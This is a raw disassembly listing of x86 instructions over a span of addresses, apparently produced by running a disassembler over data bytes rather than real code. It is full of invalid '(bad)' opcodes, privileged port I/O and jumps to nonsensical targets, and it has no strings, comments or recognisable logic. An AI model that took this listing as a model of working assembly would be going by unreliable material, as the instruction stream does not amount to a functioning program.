  40fb27:	mov    ds:0x23ace1b6,al
  40fb2c:	lea    ebx,[ebp+0xf]
  40fb2f:	fs psrld mm7,mm1
  40fb33:	stos   BYTE PTR es:[edi],al
  40fb34:	shl    DWORD PTR [ecx+0x2a3dce83],1
  40fb3a:	cs sub eax,0xa45544c9
  40fb40:	jae    0x40fbb0
  40fb42:	imul   esp,edx,0xe68b9229
  40fb48:	test   al,0xb4
  40fb4a:	out    dx,eax
  40fb4b:	cs test al,ch
  40fb4e:	outs   dx,DWORD PTR ds:[esi]
  40fb4f:	scas   eax,DWORD PTR es:[edi]
  40fb50:	out    dx,al
  40fb51:	jae    0x40fb3f
  40fb53:	adc    al,0x58
  40fb55:	or     DWORD PTR [ebx-0x5f],ecx
  40fb58:	pushf  
  40fb59:	adc    al,0xe0
  40fb5b:	fs cdq 
  40fb5d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fb5e:	add    al,0x89
  40fb60:	mov    WORD PTR [edi+0x100354bb],gs
  40fb66:	pop    ss
  40fb67:	sub    ecx,DWORD PTR [esi]
  40fb69:	push   ecx
  40fb6a:	stos   BYTE PTR es:[edi],al
  40fb6b:	cmp    al,0xa1
  40fb6d:	add    edx,DWORD PTR [ebx+ebx*4]
  40fb70:	xchg   esi,eax
  40fb71:	mov    cl,0xf6
  40fb73:	push   esp
  40fb74:	push   ss
  40fb75:	fimul  DWORD PTR [ebx+0x2f]
  40fb78:	mov    al,0xa7
  40fb7a:	jmp    0xda4f203
  40fb7f:	jnp    0x40fbf4
  40fb81:	shl    DWORD PTR [eax-0x7bd08a4f],cl
  40fb87:	pop    sp
  40fb89:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fb8a:	jo     0x40fb0c
  40fb8c:	fcmovne st,st(0)
  40fb8e:	out    0x89,al
  40fb90:	arpl   WORD PTR [edi-0x29],bp
  40fb93:	outs   dx,BYTE PTR ds:[esi]
  40fb94:	arpl   di,bp
  40fb96:	in     al,0x92
  40fb98:	sub    BYTE PTR [esi],bl
  40fb9a:	mov    eax,eax
  40fb9c:	mov    dl,0xf6
  40fb9e:	mov    al,ds:0xefed71ef
  40fba3:	pop    es
  40fba4:	mov    ebx,0x5966bd53
  40fba9:	repnz mov esi,0x61b3f7cc
  40fbaf:	and    cl,bh
  40fbb1:	pusha  
  40fbb2:	rcr    BYTE PTR [ebx],1
  40fbb4:	mov    es,WORD PTR [ecx-0x299f10a]
  40fbba:	mov    WORD PTR [edx+0x4],?
  40fbbd:	adc    BYTE PTR ss:[edx+0x63],al
  40fbc1:	xor    ecx,DWORD PTR [ecx-0x5c959669]
  40fbc7:	mov    ecx,0xe75db14b
  40fbcc:	xchg   ebp,eax
  40fbcd:	jns    0x40fba6
  40fbcf:	es inc eax
  40fbd1:	mov    ebp,0xa83485d7
  40fbd6:	arpl   bx,sp
  40fbd8:	push   edi
  40fbd9:	add    eax,0xd80ee3a5
  40fbde:	int3   
  40fbdf:	mov    al,0x2f
  40fbe1:	pop    ebp
  40fbe2:	sub    DWORD PTR [edx+0x45],eax
  40fbe5:	mov    bl,0xc
  40fbe7:	mov    ecx,0xf9f23f7c
  40fbec:	scas   eax,DWORD PTR es:[edi]
  40fbed:	aaa    
  40fbee:	pop    edi
  40fbef:	jle    0x40fbbf
  40fbf1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fbf2:	dec    ebx
  40fbf3:	pop    ecx
  40fbf4:	cmc    
  40fbf5:	mov    esp,0x4fc4fd55
  40fbfa:	dec    eax
  40fbfb:	icebp  
  40fbfc:	fldcw  WORD PTR [ebx]
  40fbfe:	jmp    0x40fbb9
  40fc00:	cmp    al,0x79
  40fc02:	xchg   ebx,eax
  40fc03:	(bad)  
  40fc04:	sti    
  40fc05:	or     DWORD PTR [esi],edx
  40fc07:	add    al,0x11
  40fc09:	test   eax,0x9e0acc0c
  40fc0e:	pop    edx
  40fc0f:	mov    al,0xb
  40fc11:	push   es
  40fc12:	jae    0x40fb9d
  40fc14:	jbe    0x40fbea
  40fc16:	fistp  QWORD PTR [ebx+0x3c]
  40fc19:	sub    BYTE PTR [ebp+0xc],dh
  40fc1c:	popa   
  40fc1d:	out    0x1b,al
  40fc1f:	mov    ds:0x1281c33e,eax
  40fc24:	sub    eax,0xa251dd05
  40fc29:	xor    cl,BYTE PTR [ebp+0x52ce7347]
  40fc2f:	pop    esi
  40fc30:	int3   
  40fc31:	xor    DWORD PTR [edi-0x7680868b],ebp
  40fc37:	push   cs
  40fc38:	xchg   ecx,eax
  40fc39:	(bad)  
  40fc3a:	in     eax,dx
  40fc3b:	jp     0x40fc52
  40fc3d:	outs   dx,BYTE PTR ds:[esi]
  40fc3e:	adc    BYTE PTR [esi+0xa],al
  40fc41:	sub    DWORD PTR [edx+0x8],esp
  40fc44:	push   ecx
  40fc45:	outs   dx,BYTE PTR ds:[esi]
  40fc46:	mov    BYTE PTR [esi+0x791b4c0d],bl
  40fc4c:	(bad)  
  40fc4d:	push   ebp
  40fc4e:	(bad)  
  40fc50:	stc    
  40fc51:	fidivr DWORD PTR [ecx+0x67cdcc55]
  40fc57:	loope  0x40fc3d
  40fc59:	push   ss
  40fc5a:	adc    DWORD PTR [ebx+0x4f],0x71f388f4
  40fc61:	jnp    0x40fc74
  40fc63:	iret   
  40fc64:	and    al,0xf2
  40fc66:	loop   0x40fc15
  40fc68:	dec    eax
  40fc69:	sahf   
  40fc6a:	mov    ds:0x69afeb76,al
  40fc6f:	repz jp 0x40fc54
  40fc72:	xor    bh,BYTE PTR [eax+0x13]
  40fc75:	aad    0x2a
  40fc77:	mov    bl,0xa6
  40fc79:	(bad)
  40fc7c:	mov    ebx,0xaf005be8
  40fc81:	pop    eax
  40fc82:	and    al,0x10
  40fc84:	in     eax,dx
  40fc85:	fisubr DWORD PTR [eax]
  40fc87:	sbb    eax,0xd48d3a0f
  40fc8c:	ss push 0xffffffe0
  40fc8f:	mov    eax,0x983d0598
  40fc94:	ss push 0x58
  40fc97:	in     al,dx
  40fc98:	in     eax,dx
  40fc99:	stos   DWORD PTR es:[edi],eax
  40fc9a:	dec    ebp
  40fc9b:	jl     0x40fd10
  40fc9d:	cli    
  40fc9e:	shr    BYTE PTR [eax+0x7d],1
  40fca1:	lea    esi,ds:0x94108d09
  40fca7:	fcom   QWORD PTR [eax]
  40fca9:	pop    ss
  40fcaa:	lock xor dl,BYTE PTR [ebx]
  40fcad:	retf   0x56bd
  40fcb0:	mov    al,0xe1
  40fcb2:	cmp    BYTE PTR [esi],dl
  40fcb4:	xchg   edx,eax
  40fcb5:	jne    0x40fc75
  40fcb7:	fdiv   QWORD PTR [esi+ebx*2+0x1acff1c0]
  40fcbe:	mov    ds:0x83cf139e,al
  40fcc3:	jmp    0x40fc72
  40fcc5:	aam    0xfa
  40fcc7:	jge    0x40fcba
  40fcc9:	xchg   edx,eax
  40fcca:	jb     0x40fc6a
  40fccc:	es push esp
  40fcce:	addr16 (bad) 
  40fcd1:	mov    esi,0x4d3ed218
  40fcd6:	pop    edx
  40fcd7:	sub    al,0x6
  40fcd9:	inc    edi
  40fcda:	dec    ebx
  40fcdb:	mov    ebx,DWORD PTR [edi+ebx*8+0xb]
  40fcdf:	repnz sbb eax,0x91a31cc3
  40fce5:	sbb    eax,0xb9945952
  40fcea:	and    BYTE PTR [ecx-0x11300906],cl
  40fcf0:	xchg   ebp,eax
  40fcf1:	mov    WORD PTR [esi-0x67],?
  40fcf4:	push   cs
  40fcf5:	add    DWORD PTR [ebx+0x6e457ab0],ecx
  40fcfb:	iret   
  40fcfc:	push   ebp
  40fcfd:	gs xchg edi,eax
  40fcff:	jl     0x40fcba
  40fd01:	mov    ss,WORD PTR [eax+eiz*2-0x43]
  40fd05:	icebp  
  40fd06:	fmul   DWORD PTR [eax+0x2c484cf4]
  40fd0c:	xchg   edx,eax
  40fd0d:	mov    BYTE PTR [eax*4+0x480fb977],cl
  40fd14:	leave  
  40fd15:	pop    edx
  40fd16:	sbb    BYTE PTR ds:0xf5e82d69,0x7b
  40fd1d:	adc    DWORD PTR [edx+ebp*2],edi
  40fd20:	pop    eax
  40fd21:	clc    
  40fd22:	add    ebp,DWORD PTR [eax+0x72]
  40fd25:	in     eax,dx
  40fd26:	mov    cl,0xf4
  40fd28:	js     0x40fd93
  40fd2a:	and    ebx,eax
  40fd2c:	cmp    bh,BYTE PTR [edi+0x28]
  40fd2f:	sbb    cl,bl
  40fd31:	shl    BYTE PTR [edi+0x43],1
  40fd34:	xchg   ebx,eax
  40fd35:	cdq    
  40fd36:	mov    eax,ds:0xd337d32c
  40fd3b:	inc    eax
  40fd3c:	outs   dx,DWORD PTR ds:[esi]
  40fd3d:	xor    eax,0xdb99c635
  40fd42:	mov    ds:0xdf9c7685,al
  40fd47:	dec    ebp
  40fd48:	adc    al,0xf2
  40fd4a:	xchg   BYTE PTR [ebp+0x6c],dl
  40fd4d:	in     al,0x74
  40fd4f:	out    dx,eax
  40fd50:	mov    ebp,0x8d4bc963
  40fd55:	sub    BYTE PTR [esi-0x4f4f370b],dh
  40fd5b:	dec    ecx
  40fd5c:	sub    al,0x1a
  40fd5e:	pop    ds
  40fd5f:	aas    
  40fd60:	dec    esi
  40fd61:	imul   ecx,DWORD PTR [ebx-0x59cb8c27],0x3bbb884c
  40fd6b:	lock test edx,ebx
  40fd6e:	and    BYTE PTR [edi],bh
  40fd70:	das    
  40fd71:	cdq    
  40fd72:	int3   
  40fd73:	mov    bh,0x9
  40fd75:	clc    
  40fd76:	in     eax,0x59
  40fd78:	cmc    
  40fd79:	(bad)  
  40fd7a:	pusha  
  40fd7b:	mov    ch,0x59
  40fd7d:	adc    BYTE PTR [edi-0x13],cl
  40fd80:	pop    ds
  40fd81:	stos   BYTE PTR es:[edi],al
  40fd82:	clc    
  40fd83:	mov    dh,0x36
  40fd85:	mov    BYTE PTR [ebx],dh
  40fd87:	lods   eax,DWORD PTR ds:[si]
  40fd89:	(bad)  
  40fd8a:	sbb    edi,DWORD PTR [ecx]
  40fd8c:	jb     0x40fd2d
  40fd8e:	pop    ebx
  40fd8f:	clc    
  40fd90:	stc    
  40fd91:	lods   eax,DWORD PTR ds:[esi]
  40fd92:	pop    eax
  40fd93:	leave  
  40fd94:	and    ebx,DWORD PTR ds:0x4557b419
  40fd9a:	fstp   QWORD PTR [ebx]
  40fd9c:	xchg   edx,eax
  40fd9d:	test   al,0xb3
  40fd9f:	shl    ch,1
  40fda1:	mov    WORD PTR [ebp-0xeb4005a],gs
  40fda7:	sub    edi,DWORD PTR gs:[eax+0x34]
  40fdab:	xor    al,0x51
  40fdad:	or     DWORD PTR [ebp-0x2e],ebp
  40fdb0:	push   eax
  40fdb1:	xchg   ecx,eax
  40fdb2:	je     0x40fdbf
  40fdb4:	mov    edx,0xe2e44195
  40fdb9:	jle    0x40fd4f
  40fdbb:	xchg   ecx,eax
  40fdbc:	in     eax,dx
  40fdbd:	sbb    eax,0x74f38b3f
  40fdc2:	aas    
  40fdc3:	xchg   esi,eax
  40fdc4:	(bad)  
  40fdc5:	mov    ah,0x84
  40fdc7:	ss cmp eax,0xda0616d7
  40fdcd:	cli    
  40fdce:	mov    ecx,0xd21fdb7b
  40fdd3:	jg     0x40fdc3
  40fdd5:	scas   al,BYTE PTR es:[edi]
  40fdd6:	xchg   esi,eax
  40fdd7:	(bad)  
  40fdd8:	mov    bl,0xc8
  40fdda:	push   eax
  40fddb:	pushf  
  40fddc:	lods   al,BYTE PTR ss:[esi]
  40fdde:	outs   dx,BYTE PTR ds:[esi]
  40fddf:	mov    dh,0xd8
  40fde1:	das    
  40fde2:	jbe    0x40fdbe
  40fde4:	hlt    
  40fde5:	sub    bh,BYTE PTR [edi+0x4d2b004f]
  40fdeb:	adc    esi,DWORD PTR [ecx+0x7d]
  40fdee:	outs   dx,DWORD PTR ds:[esi]
  40fdef:	ret    0x6cad
  40fdf2:	push   esi
  40fdf3:	leave  
  40fdf4:	(bad)  
  40fdf5:	aaa    
  40fdf6:	aas    
  40fdf7:	or     al,0x59
  40fdf9:	gs aam 0xb4
  40fdfc:	fstp   QWORD PTR [esi]
  40fdfe:	or     DWORD PTR [edi-0x2a332be4],edi
  40fe04:	shl    BYTE PTR [edx+0x31],1
  40fe07:	cmp    DWORD PTR [edi],0xa3cca180
  40fe0d:	neg    BYTE PTR [edi-0x27]
  40fe10:	mov    ebx,0xd7fe0083
  40fe15:	call   FWORD PTR [esi-0x395ef0c5]
  40fe1b:	test   eax,0xdbf5ffb8
  40fe20:	mov    eax,0x695e0dd8
  40fe25:	xlat   BYTE PTR ds:[ebx]
  40fe26:	inc    eax
  40fe27:	mov    ebx,0x9b2e3f4b
  40fe2c:	xchg   ecx,eax
  40fe2d:	loop   0x40fdb1
  40fe2f:	scas   eax,DWORD PTR es:[edi]
  40fe30:	or     eax,0x58db7460
  40fe35:	mov    dl,0xa4
  40fe37:	jb     0x40fe68
  40fe39:	retf   
  40fe3a:	repz cmp edx,edx
  40fe3d:	xor    edx,0x8896426d
  40fe43:	or     ch,0x24
  40fe46:	out    dx,eax
  40fe47:	sbb    dh,bl
  40fe49:	add    BYTE PTR [ebx],dh
  40fe4b:	aam    0xeb
  40fe4d:	daa    
  40fe4e:	mov    DWORD PTR [ecx],edi
  40fe50:	pusha  
  40fe51:	sti    
  40fe52:	cld    
  40fe53:	inc    ecx
  40fe54:	call   0x4218338f
  40fe59:	inc    edi
  40fe5a:	dec    ebp
  40fe5b:	(bad)  [esi+0x75]
  40fe5e:	and    eax,0x1e8de714
  40fe63:	je     0x40fdfc
  40fe65:	mov    dh,0x4b
  40fe67:	and    DWORD PTR [ecx+edi*2+0x45],esi
  40fe6b:	aam    0x85
  40fe6d:	lds    esi,FWORD PTR ds:[ecx]
  40fe70:	repz test BYTE PTR [eax+0x109e67a0],0x41
  40fe78:	scas   eax,DWORD PTR es:[edi]
  40fe79:	jl     0x40fe00
  40fe7b:	push   ss
  40fe7c:	stos   DWORD PTR es:[edi],eax
  40fe7d:	sbb    al,0x74
  40fe7f:	inc    ebp
  40fe80:	test   al,0xb4
  40fe82:	xor    edi,DWORD PTR [edx]
  40fe84:	pushf  
  40fe85:	jg     0x40feb6
  40fe87:	jmp    0x40fedd
  40fe89:	js     0x40feb5
  40fe8b:	adc    ch,BYTE PTR [ebx-0x60bc71e8]
  40fe91:	scas   eax,DWORD PTR es:[edi]
  40fe92:	lods   al,BYTE PTR ds:[esi]
  40fe93:	push   ds
  40fe94:	and    cl,BYTE PTR [ecx]
  40fe96:	rol    BYTE PTR ds:0x128ef140,0x9d
  40fe9d:	xchg   ecx,eax
  40fe9e:	xlat   BYTE PTR ds:[ebx]
  40fe9f:	push   edi
  40fea0:	(bad)  [esi+0x61b465dd]
  40fea6:	push   ss
  40fea7:	dec    edi
  40fea8:	ret    
  40fea9:	sar    BYTE PTR [eax+esi*2+0x536dda0d],1
  40feb0:	add    edi,edi
  40feb2:	popf   
  40feb3:	push   cs
  40feb4:	pop    edi
  40feb5:	pop    ebp
  40feb6:	out    dx,eax
  40feb7:	sub    al,0x8f
  40feb9:	stos   DWORD PTR es:[edi],eax
  40feba:	leave  
  40febb:	jbe    0x40fea2
  40febd:	dec    esp
  40febe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40febf:	into   
  40fec0:	pop    ecx
  40fec1:	or     ah,ch
  40fec3:	or     bh,BYTE PTR [eax-0x34]
  40fec6:	inc    eax
  40fec7:	jo     0x40ff10
  40fec9:	icebp  
  40feca:	lea    ecx,[esi]
  40fecc:	jbe    0x40ff03
  40fece:	sbb    al,0x94
  40fed0:	jmp    0x40febf
  40fed2:	push   esp
  40fed3:	mov    ah,0xc8
  40fed5:	jmp    0x9dfb6a32
  40feda:	daa    
  40fedb:	pop    esi
  40fedc:	mov    edi,0x97f8feaf
  40fee1:	scas   eax,DWORD PTR es:[edi]
  40fee2:	pop    es
  40fee3:	in     al,0xe8
  40fee5:	mov    esp,0xe13692dc
  40feea:	popf   
  40feeb:	lea    edx,[ebp+0x281b3d66]
  40fef1:	mov    ch,0x8b
  40fef3:	xchg   edi,eax
  40fef4:	outs   dx,BYTE PTR ds:[esi]
  40fef5:	leave  
  40fef6:	mov    ecx,0xac31e786
  40fefb:	(bad)  
  40fefc:	mov    esp,0xdb1d8631
  40ff01:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ff02:	nop
  40ff03:	cli    
  40ff04:	jno    0x40ff25
  40ff06:	xchg   esp,eax
  40ff07:	xor    BYTE PTR [ecx-0x7265ce5d],bh
  40ff0d:	pop    eax
  40ff0e:	lods   eax,DWORD PTR ds:[esi]
  40ff0f:	push   edi
  40ff10:	out    dx,al
  40ff11:	data16 jne 0x40ff41
  40ff14:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ff15:	xor    eax,0xd21fc37f
  40ff1a:	xchg   esi,eax
  40ff1b:	mov    ebp,0xa6be70c1
  40ff20:	pop    ds
  40ff21:	add    al,0x8f
  40ff23:	popa   
  40ff24:	jmp    DWORD PTR [edx+0x3f]
  40ff27:	leave  
  40ff28:	sbb    BYTE PTR [ecx],cl
  40ff2a:	add    al,0x73
  40ff2c:	in     eax,0x69
  40ff2e:	fisttp DWORD PTR [edi+edx*4+0x75]
  40ff32:	ret    0xaab9
  40ff35:	mov    DWORD PTR [edi+0x77],edi
  40ff38:	push   es
  40ff39:	pop    ds
  40ff3a:	mov    cl,0xf7
  40ff3c:	imul   edi,esi,0xffffff92
  40ff3f:	inc    edx
  40ff40:	(bad)  
  40ff41:	fst    DWORD PTR [edi+edi*4-0x33]
  40ff45:	push   cs
  40ff46:	shl    ecx,cl
  40ff48:	bound  ebp,QWORD PTR [edx]
  40ff4a:	imul   eax,DWORD PTR ds:0xa8eaed4a,0x9
  40ff51:	pop    ebx
  40ff52:	mov    esp,0x3796008f
  40ff57:	mov    WORD PTR [edx-0x4d83dd2b],cs
  40ff5d:	pop    esi
  40ff5e:	push   cs
  40ff5f:	icebp  
  40ff60:	inc    ecx
  40ff61:	adc    BYTE PTR [edi+0x1b5e299d],dl
  40ff67:	xorps  xmm1,XMMWORD PTR [edx+0x281810e0]
  40ff6e:	ins    DWORD PTR es:[edi],dx
  40ff6f:	jne    0x40ffd0
  40ff71:	cmp    DWORD PTR ds:0xca2f8ec5,esp
  40ff77:	je     0x40ffe1
  40ff79:	push   0xffffffc6
  40ff7b:	(bad)  
  40ff7c:	stc    
  40ff7d:	into   
  40ff7e:	xchg   edx,esp
  40ff80:	fmul   QWORD PTR [edi-0x4c14ba60]
  40ff86:	ret    
  40ff87:	and    cl,BYTE PTR [edx+ebp*2-0x5bcdd5d4]
  40ff8e:	push   ebx
  40ff8f:	xor    bh,BYTE PTR [ecx+0x59dbec9a]
  40ff95:	jg     0x40ffdf
  40ff97:	mov    eax,0xc804141d
  40ff9c:	cmp    esp,DWORD PTR [ebx]
  40ff9e:	xchg   ebx,eax
  40ff9f:	cwde   
  40ffa0:	xlat   BYTE PTR ds:[ebx]
  40ffa1:	xlat   BYTE PTR ds:[ebx]
  40ffa2:	jo     0x40ff79
  40ffa4:	mov    edi,0x926439fe
  40ffa9:	gs dec edi
  40ffab:	adc    DWORD PTR [eax],ebp
  40ffad:	out    dx,eax
  40ffae:	nop
  40ffaf:	dec    eax
  40ffb0:	mov    eax,ds:0x5687b796
  40ffb5:	xor    eax,eax
  40ffb7:	pop    ebp
  40ffb8:	in     al,0x8b
  40ffba:	stos   BYTE PTR es:[edi],al
  40ffbb:	mov    ds,WORD PTR [eax+0x3d]
  40ffbe:	sbb    DWORD PTR [ebp+0x3e],ebx
  40ffc1:	cmc    
  40ffc2:	arpl   WORD PTR [esi+0x605be971],sp
  40ffc8:	mov    ds:0x6bcdce7,eax
  40ffcd:	outs   dx,BYTE PTR ds:[esi]
  40ffce:	(bad)  
  40ffcf:	add    BYTE PTR [bp+di-0x4c],dh
  40ffd3:	and    eax,0xa6a2c986
  40ffd8:	xchg   ebp,eax
  40ffd9:	push   ss
  40ffda:	jnp    0x40ff72
  40ffdc:	pop    esp
  40ffdd:	xchg   esp,eax
  40ffde:	mov    WORD PTR [edx+0x23bb708d],?
  40ffe4:	adc    eax,0xd29e2d93
  40ffe9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ffea:	imul   edi,DWORD PTR ds:[ecx-0x78d8a3f2],0x6ed44241
  40fff5:	jle    0x41005f
  40fff7:	dec    ecx
  40fff8:	sbb    eax,0x43d1415
  40fffd:	mov    BYTE PTR [edi],bl
  40ffff:	imul   ecx,eax,0x3c6f6a7d
  410005:	mov    ah,0x5
  410007:	push   cs
  410008:	pop    eax
  410009:	into   
  41000a:	and    ch,ah
  41000c:	and    BYTE PTR [eax-0x47d149a7],dl
  410012:	jae    0x410073
  410014:	and    al,BYTE PTR [eax]
  410016:	(bad)  
  410017:	sbb    esi,edi
  410019:	loope  0x40ffb4
  41001b:	fiadd  DWORD PTR [ecx+0x1b]
  41001e:	test   eax,0x87e29799
  410023:	mov    cl,0x8f
  410025:	and    BYTE PTR [ebx],dl
  410027:	push   cs
  410028:	repz push ebx
  41002a:	(bad)  
  41002b:	out    dx,al
  41002c:	lahf   
  41002d:	pop    eax
  41002e:	inc    eax
  41002f:	sbb    eax,0x376e55ea
  410034:	xchg   ebx,ebx
  410036:	pop    eax
  410037:	ins    DWORD PTR es:[edi],dx
  410038:	les    eax,FWORD PTR [ecx]
  41003a:	das    
  41003b:	adc    ecx,DWORD PTR [edi]
  41003d:	rcl    BYTE PTR ds:[ecx-0x1c],0x1f
  410042:	sub    esp,DWORD PTR [ebx+0x5f3e036b]
  410048:	push   eax
  410049:	imul   eax,DWORD PTR [edx+edx*4+0x6d],0xffffffdf
  41004e:	inc    ecx
  41004f:	inc    ebp
  410050:	and    al,0x99
  410052:	xor    ebx,esi
  410054:	xchg   edi,eax
  410055:	mov    ds:0xb9793ff4,eax
  41005a:	pop    edi
  41005b:	mov    DWORD PTR [esi+0x75],0x5523416c
  410062:	into   
  410063:	sti    
  410064:	adc    dh,bl
  410066:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410067:	dec    ebp
  410068:	imul   ebp,DWORD PTR [ebx],0x74
  41006b:	xchg   al,bh
  41006d:	dec    ebx
  41006e:	loopne 0x4100ae
  410070:	xchg   ebx,eax
  410071:	or     ecx,DWORD PTR [esi+0x4022aaec]
  410077:	pop    es
  410078:	xor    al,0xbe
  41007a:	sub    bh,BYTE PTR [edx-0x65c85d7d]
  410080:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410081:	arpl   cx,sp
  410083:	repz jns 0x4100b2
  410086:	fcomi  st,st(3)
  410088:	pop    ecx
  410089:	stos   BYTE PTR es:[edi],al
  41008a:	mov    edx,ds
  41008c:	cmc    
  41008d:	fisub  DWORD PTR [eax+0x44]
  410090:	adc    cl,BYTE PTR [edi+ecx*1]
  410093:	dec    ebx
  410094:	mov    eax,ds:0xa8d8dad
  410099:	pop    eax
  41009a:	dec    ebp
  41009b:	stos   DWORD PTR es:[edi],eax
  41009c:	push   eax
  41009d:	aad    0xb2
  41009f:	mov    ecx,0x6101d0b0
  4100a4:	ds pop edx
  4100a6:	ds pusha 
  4100a8:	iret   
  4100a9:	and    BYTE PTR [ebx+ebx*8],bl
  4100ac:	sar    esp,1
  4100ae:	sbb    al,0x72
  4100b0:	jl     0x410060
  4100b2:	fst    DWORD PTR [edi+0x8d284b2]
  4100b8:	or     ah,ch
  4100ba:	adc    BYTE PTR [esi+0x14911120],ch
  4100c0:	cdq    
  4100c1:	adc    DWORD PTR [ecx-0x2e3c77f2],esp
  4100c7:	dec    edx
  4100c8:	xchg   esp,eax
  4100c9:	sbb    ebx,ecx
  4100cb:	jge    0x4100f7
  4100cd:	(bad)  
  4100ce:	push   cs
  4100cf:	rcl    ah,0xcf
  4100d2:	jno    0x41007c
  4100d4:	xor    bl,ah
  4100d6:	jecxz  0x4100e5
  4100d8:	mov    ss,WORD PTR cs:[ecx+0x549df6cf]
  4100df:	out    dx,eax
  4100e0:	sar    edi,1
  4100e2:	mov    bh,0xe8
  4100e4:	sbb    DWORD PTR [edx-0x2541a532],ebp
  4100ea:	mov    bh,0x6a
  4100ec:	stc    
  4100ed:	inc    ecx
  4100ee:	jmp    DWORD PTR [ebx-0x65135f7e]
  4100f4:	jg     0x4100df
  4100f6:	sahf   
  4100f7:	and    dh,BYTE PTR [ecx-0x67046aef]
  4100fd:	add    al,0x23
  4100ff:	sub    cl,ch
  410101:	jo     0x4100c5
  410103:	lock xchg DWORD PTR [ecx],edx
  410106:	jo     0x41017e
  410108:	outs   dx,DWORD PTR ds:[esi]
  410109:	mov    ebp,DWORD PTR [bp+si]
  41010c:	icebp  
  41010d:	aas    
  41010e:	int    0x30
  410110:	pop    edi
  410111:	jb     0x41010a
  410113:	pop    eax
  410114:	or     bl,bl
  410116:	cdq    
  410117:	dec    edx
  410118:	pop    ss
  410119:	add    al,0x15
  41011b:	pop    ds
  41011c:	sub    al,0xb5
  41011e:	push   ebx
  41011f:	lods   eax,DWORD PTR ds:[esi]
  410120:	push   esi
  410121:	sbb    eax,0x383f0537
  410126:	fcom   DWORD PTR [ebx+0x43a87a59]
  41012c:	adc    BYTE PTR [ecx-0x13b5b1b1],al
  410132:	mov    eax,0xe29b8c53
  410137:	rcl    DWORD PTR [edx],0xa7
  41013a:	leave  
  41013b:	jmp    0x41015d
  41013d:	push   ebx
  41013e:	pop    es
  41013f:	xchg   DWORD PTR [esp+ecx*8-0x2d],ecx
  410143:	add    edx,DWORD PTR [esi+ebx*1+0x1f5f330d]
  41014a:	xor    ebx,edi
  41014c:	push   edx
  41014d:	iret   
  41014e:	jmp    0x59ab:0xcbea469a
  410155:	in     al,dx
  410156:	jge    0x41013d
  410158:	or     ah,bh
  41015a:	mov    edi,DWORD PTR ds:0xa2c6f1c4
  410160:	mov    ebx,0xc7275372
  410165:	push   ebx
  410166:	cmp    ah,dh
  410168:	xchg   ebp,eax
  410169:	ja     0x4101c4
  41016b:	lods   al,BYTE PTR ds:[esi]
  41016c:	add    al,0x70
  41016e:	je     0x4101c3
  410170:	in     eax,dx
  410171:	dec    esp
  410172:	loop   0x4101c2
  410174:	rol    DWORD PTR [esi+0x4],0x70
  410178:	sub    bl,BYTE PTR [edx]
  41017a:	sub    ch,BYTE PTR [ecx-0x67]
  41017d:	rol    al,1
  41017f:	sbb    BYTE PTR [edx-0x9f43d38],ah
  410185:	mov    DWORD PTR [ebx-0x2d],ecx
  410188:	add    ebx,ecx
  41018a:	rcr    DWORD PTR [edi],cl
  41018c:	iret   
  41018d:	inc    edx
  41018e:	ficom  DWORD PTR [esi-0x474aca6f]
  410194:	pop    eax
  410195:	mov    bl,0x2c
  410197:	add    BYTE PTR ds:0x5cf22192,bh
  41019d:	int    0xb2
  41019f:	sbb    al,0xd
  4101a1:	popf   
  4101a2:	lea    ebp,cs:[eax-0x53baf640]
  4101a9:	mov    ds:0xf3603de5,al
  4101ae:	call   0xf1942156
  4101b3:	(bad)  
  4101b4:	stos   DWORD PTR es:[edi],eax
  4101b5:	or     BYTE PTR ds:0xeae89b24,dl
  4101bb:	fsub   QWORD PTR [eax]
  4101bd:	and    al,0x42
  4101bf:	jp     0x41023b
  4101c1:	push   esi
  4101c2:	rol    BYTE PTR [ebp+0xc538cff],0xe9
  4101c9:	scas   al,BYTE PTR es:[edi]
  4101ca:	sbb    dl,BYTE PTR [esi+0x1ca2bd34]
  4101d0:	adc    BYTE PTR [ebx+ecx*2-0x26],dl
  4101d4:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4101d6:	sti    
  4101d7:	je     0x410226
  4101d9:	adc    bh,BYTE PTR [edx]
  4101db:	jmp    0x9e65:0x1160b9a4
  4101e2:	mov    eax,0x463c840f
  4101e7:	data16 scas al,BYTE PTR es:[edi]
  4101e9:	or     dh,0xc2
  4101ec:	jl     0x41023b
  4101ee:	mov    ebp,ebp
  4101f0:	jns    0x410257
  4101f2:	shr    ecx,cl
  4101f4:	add    ah,BYTE PTR [eax+0x65ece1c1]
  4101fa:	xor    DWORD PTR [edi],0xbc2bd2e2
  410200:	mov    es,WORD PTR [ecx]
  410202:	xor    eax,0xa4676f0d
  410207:	daa    
  410208:	mov    bh,0xee
  41020a:	and    al,0x2
  41020c:	hlt    
  41020d:	dec    esp
  41020e:	ret    
  41020f:	pop    eax
  410210:	shr    DWORD PTR [ebp-0x3e6ef037],cl
  410216:	icebp  
  410217:	ss leave 
  410219:	pop    eax
  41021a:	push   ds
  41021b:	sub    eax,DWORD PTR [edi]
  41021d:	iret   
  41021e:	jle    0x4101ba
  410220:	jmp    0xe241f697
  410225:	out    dx,eax
  410226:	xor    eax,0x968ca0fb
  41022b:	pop    edi
  41022c:	in     al,dx
  41022d:	and    DWORD PTR [edi+0x68505b03],eax
  410233:	mov    edx,0x2a0ca969
  410238:	jge    0x41029a
  41023a:	cmp    BYTE PTR [ebx-0x4db58ccb],bl
  410240:	and    eax,0x7c25c153
  410245:	fild   DWORD PTR [eax]
  410247:	sub    ecx,DWORD PTR [edi-0x4b]
  41024a:	mov    ah,0xbb
  41024c:	jl     0x410289
  41024e:	adc    eax,0xbc351d9c
  410253:	clc    
  410254:	arpl   WORD PTR [eax+0x3d1e4ae2],bp
  41025a:	add    bh,BYTE PTR [edi+0xa4bbb4d]
  410260:	(bad)  
  410261:	sti    
  410262:	or     DWORD PTR [esp+edx*8],edx
  410265:	xor    BYTE PTR [ebx+0x1639f3b9],dh
  41026b:	mov    bl,0x54
  41026d:	call   0xef51:0x525dcb3f
  410274:	shl    ecx,1
  410276:	out    dx,eax
